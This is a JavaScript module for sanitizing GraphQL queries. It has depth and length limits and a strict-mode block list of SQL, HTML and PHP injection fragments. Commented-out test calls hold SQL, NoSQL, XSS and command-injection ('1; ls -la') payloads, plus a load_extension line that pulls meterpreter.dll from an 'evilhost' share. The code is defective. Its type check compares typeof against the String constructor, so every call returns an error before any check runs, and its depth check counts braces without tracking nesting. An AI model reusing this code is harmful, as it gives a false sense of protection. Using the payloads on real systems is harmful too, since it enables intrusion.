// init sanitizeQuery, a function that accepts 4 params input (required, a graphQL query type string), strict (a bool value, default false, that enables additional query sanitization), maxDepth (the maximum query nesting depth permitted, type integer), and maxLength (maximum permitted query length, type integer) that users will require and invoke in their applications to sanitize the passed-in query
const sanitizeQuery = (
  input,
  strict = false,
  maxDepth = 10,
  maxLength = 2000
) => {
  // validate input type is string
  if (typeof input !== String) return new Error('input must be a string');
  // check if input is more deeply nested than maxDepth
  deepLimit(input, maxDepth);
  // check if input is longer than maxLength
  lengthLimit(input, maxLength);
  // if function is being run on strict mode
  if (strict) {
    // allowlisting is an option we are not currently pursuing, but could help further secure our queries
    // init const blockList as arr of potentially malicious fragments (strings)
    const blockList = [
      // common SQL injection fragments
      '1=1',
      `' OR`,
      'select sqlite_version()',
      'SELECT sql FROM sqlite_schema',
      `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'`,
      // common HTML injection fragments
      '<script',
      'script/>',
      'script',
      // dangerous characters
      '<',
      '>',
      '-',
      '/',
      "'",
      `{"`,
      `"{`,
      `}"`,
      `*`,
      `"}`,
      `\\`,
      `{\\`,
      // log spoofing
      `%`,
      // PHP code insertion
      'php',
    ];
    // iterate through each string in blockList
    for (const str of blockList) {
      // if input (query) contains a potentially malicious fragment, throw new error
      if (input.includes(str))
        throw new Error(`potentially malicious string detected:, ${str}`);
    }
  }
  // amount limiting (limiting number of times a query can be called)
};

// init helper func deepLimit that accepts two params, input (a JSON string graphQL query) and depth (a number value) and throws an error if the passed-in input has a depth greater than depth, else returns input
const deepLimit = (input, depth) => {
  // init const stack as an empty array
  const stack = [];
  // iterate through the input array
  for (let i = 0; i < input.length; i++) {
    if (stack.length > depth)
      throw new Error(
        'Maximum query depth exceeded, modify query or maximum permitted query depth'
      );
    const el = input[i];
    // if the element is '{' push it to the stack
    if (el === '{') stack.push(el);
  }
  return input;
};

// init helper func deepLimit that accepts two params, input (a JSON string graphQL query) and length (a number value) and throws an error if the passed-in input has a length greater than length, else returns input
const lengthLimit = (input, length) => {
  // if input length exceeds passed-in param length, throw new Error
  if (input.length > length)
    throw new Error(
      'Maximum query length exceeded, modify query or maximum permitted query length'
    );
  // if input depth is within the permitted limits, return input
  return input;
};

// sanitizeQuery testing
// console.log(
//   sanitizeQuery(
//     `query maliciousQuery {
//   thread(id: "some-id") {
//     messages(first: 99999) {
//       thread {
//         messages(first: 99999) {
//           thread {
//             messages(first: 99999) {
//               thread {
//                 # ...repeat times 10000...
//               }
//             }
//           }
//         }
//       }
//     }
//   }
// }`,
//     true,
//     10,
//     1000
//   )
// );

// console.log(
//   sanitizeQuery(
//     `query {
//       users(search: "{\"email\": {\"$gte\": \"\"}}",
//             options: "{\"fields\": {}}") {
//           _id
//           username
//           fullname
//           email
//       }
//   }`,
//     true
//   )
// );

// console.log(
//   sanitizeQuery(`SELECT * from customers where id='1233' OR 2=2—'`, true)
// );

// console.log(
//   sanitizeQuery(
//     `mutation {
//     createPaste(title:"<h1>hello!</h1><script>alert('Attack')</script>", content:"zzzz", public:true) {
//       paste {
//         id
//       }
//     }
//    }`,
//     true
//   )
// );

// console.log(
//   sanitizeQuery(
//     `query {
//       customer(id: "22371' OR 1=1–") {
//         name,
//         email,
//         address,
//         contact
//       }
//     } `,
//     true
//   )
// );

// console.log(
//   sanitizeQuery(
//     `query {
//       users(search: "{\"username\": {\"$regex\": \"jan\"}, \"email\": {\"$regex\": \"jan\"}}",
//             options: "{\"skip\": 0, \"limit\": 10}") {
//           _id
//           username
//           fullname
//           email
//       }
//   }`,
//     true
//   )
// );

// console.log(
//   sanitizeQuery(
//     `query {
//     users(search: "{\"email\": {\"$gte\": \"\"}}",
//     options: "{\"fields\": {}}") {
//   _id
//   username
//   fullname
//   email
// }
// }`,
//     true
//   )
// );

// console.log(
//   sanitizeQuery(
//     `query {
//       user(username: "*") {
//         name
//         email
//         groups
//       }
//     }`,
//     true
//   )
// );

// console.log(
//   sanitizeQuery(
//     `query {
//       getUser(id: "1; ls -la") {
//         name
//         email
//       }
//     }`,
//     true
//   )
// );

// console.log(
//   sanitizeQuery(
//     `query {
//       getComment(id: "1") {
//         user
//         comment: "<script>alert('XSS Attack')</script>"
//       }
//     }`,
//     true
//   )
// );

// console.log(
//   sanitizeQuery(
//     `query {
//       getComment(id: "1") {
//         user
//         comment: "<script>alert('XSS Attack')</script>"
//       }
//     }`,
//     true
//   )
// );

// console.log(
//   sanitizeQuery(
//     `UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
//     `,
//     true
//   )
// );

module.exports = sanitizeQuery;
